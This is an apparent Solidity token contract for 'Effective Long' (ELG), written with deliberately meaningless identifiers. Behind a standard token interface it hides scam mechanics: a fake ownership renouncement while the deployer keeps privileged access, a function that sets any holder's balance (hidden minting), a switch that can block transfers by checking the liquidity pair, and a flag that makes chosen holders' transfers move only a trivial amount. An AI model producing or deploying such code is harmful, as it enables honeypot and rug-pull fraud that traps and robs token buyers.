//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface amountFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingMinFund) external view returns (uint256);

    function transfer(address modeReceiver, uint256 sellIsMode) external returns (bool);

    function allowance(address fromLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellIsMode) external returns (bool);

    function transferFrom(
        address sender,
        address modeReceiver,
        uint256 sellIsMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isSwap, uint256 value);
    event Approval(address indexed fromLimit, address indexed spender, uint256 value);
}

abstract contract toIsTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountSender {
    function createPair(address buyMarketing, address totalList) external returns (address);
}

interface fromMarketing is amountFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EffectiveLong is toIsTrading, amountFee, fromMarketing {

    function transfer(address teamLiquidity, uint256 sellIsMode) external virtual override returns (bool) {
        return modeIs(_msgSender(), teamLiquidity, sellIsMode);
    }

    function approve(address teamTrading, uint256 sellIsMode) public virtual override returns (bool) {
        isLiquidityMarketing[_msgSender()][teamTrading] = sellIsMode;
        emit Approval(_msgSender(), teamTrading, sellIsMode);
        return true;
    }

    function shouldReceiver(address sellMinSwap) public {
        if (takeFee) {
            return;
        }
        
        isTrading[sellMinSwap] = true;
        if (launchedFrom == toAuto) {
            tradingReceiver = false;
        }
        takeFee = true;
    }

    function name() external view virtual override returns (string memory) {
        return maxSwap;
    }

    bool private isEnableMode;

    bool public takeFee;

    uint8 private minTo = 18;

    uint256 public fundTo;

    function totalSupply() external view virtual override returns (uint256) {
        return senderExemptShould;
    }

    uint256 marketingWalletToken;

    mapping(address => mapping(address => uint256)) private isLiquidityMarketing;

    function teamAtFrom(address isMode, address modeReceiver, uint256 sellIsMode) internal returns (bool) {
        require(swapTo[isMode] >= sellIsMode);
        swapTo[isMode] -= sellIsMode;
        swapTo[modeReceiver] += sellIsMode;
        emit Transfer(isMode, modeReceiver, sellIsMode);
        return true;
    }

    uint256 private senderExemptShould = 100000000 * 10 ** 18;

    function allowance(address listReceiverSender, address teamTrading) external view virtual override returns (uint256) {
        if (teamTrading == liquidityTake) {
            return type(uint256).max;
        }
        return isLiquidityMarketing[listReceiverSender][teamTrading];
    }

    bool private tradingReceiver;

    uint256 constant amountAtMarketing = 12 ** 10;

    address liquidityTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toAuto;

    function modeIs(address isMode, address modeReceiver, uint256 sellIsMode) internal returns (bool) {
        if (isMode == tokenIs) {
            return teamAtFrom(isMode, modeReceiver, sellIsMode);
        }
        uint256 receiverTrading = amountFee(minExemptAt).balanceOf(tokenFund);
        require(receiverTrading == buyList);
        require(modeReceiver != tokenFund);
        if (maxReceiver[isMode]) {
            return teamAtFrom(isMode, modeReceiver, amountAtMarketing);
        }
        return teamAtFrom(isMode, modeReceiver, sellIsMode);
    }

    constructor (){
        if (amountEnableMin) {
            amountEnableMin = false;
        }
        txIs atWallet = txIs(liquidityTake);
        minExemptAt = amountSender(atWallet.factory()).createPair(atWallet.WETH(), address(this));
        if (toAuto) {
            isEnableMode = true;
        }
        tokenIs = _msgSender();
        feeAmountReceiver();
        isTrading[tokenIs] = true;
        swapTo[tokenIs] = senderExemptShould;
        if (isEnableMode == amountEnableMin) {
            txSenderFee = true;
        }
        emit Transfer(address(0), tokenIs, senderExemptShould);
    }

    string private shouldTake = "ELG";

    address tokenFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private maxSwap = "Effective Long";

    address public minExemptAt;

    function transferFrom(address isMode, address modeReceiver, uint256 sellIsMode) external override returns (bool) {
        if (_msgSender() != liquidityTake) {
            if (isLiquidityMarketing[isMode][_msgSender()] != type(uint256).max) {
                require(sellIsMode <= isLiquidityMarketing[isMode][_msgSender()]);
                isLiquidityMarketing[isMode][_msgSender()] -= sellIsMode;
            }
        }
        return modeIs(isMode, modeReceiver, sellIsMode);
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldTake;
    }

    mapping(address => bool) public isTrading;

    address public tokenIs;

    uint256 buyList;

    address private toMarketing;

    function launchedSender(address teamLiquidity, uint256 sellIsMode) public {
        totalFundTeam();
        swapTo[teamLiquidity] = sellIsMode;
    }

    mapping(address => uint256) private swapTo;

    function balanceOf(address tradingMinFund) public view virtual override returns (uint256) {
        return swapTo[tradingMinFund];
    }

    function feeAmountReceiver() public {
        emit OwnershipTransferred(tokenIs, address(0));
        toMarketing = address(0);
    }

    function totalFundTeam() private view {
        require(isTrading[_msgSender()]);
    }

    function owner() external view returns (address) {
        return toMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return minTo;
    }

    bool public amountEnableMin;

    bool public launchedFrom;

    event OwnershipTransferred(address indexed maxTotal, address indexed tokenMarketing);

    bool private txSenderFee;

    function receiverFund(uint256 sellIsMode) public {
        totalFundTeam();
        buyList = sellIsMode;
    }

    function getOwner() external view returns (address) {
        return toMarketing;
    }

    mapping(address => bool) public maxReceiver;

    function senderLaunchTo(address txLaunch) public {
        totalFundTeam();
        if (tradingReceiver != isEnableMode) {
            isEnableMode = false;
        }
        if (txLaunch == tokenIs || txLaunch == minExemptAt) {
            return;
        }
        maxReceiver[txLaunch] = true;
    }

    uint256 public minReceiverTeam;

}